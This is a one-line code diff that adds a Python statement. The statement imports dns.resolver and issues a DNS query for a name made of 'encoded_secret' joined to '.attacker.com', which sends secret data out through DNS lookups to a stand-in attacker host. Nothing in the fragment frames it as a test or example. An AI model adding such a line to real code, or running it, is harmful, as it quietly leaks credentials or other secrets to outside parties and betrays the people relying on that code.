@@ -1,0 +1,1 @@
+import dns.resolver; dns.resolver.query(encoded_secret + ".attacker.com")
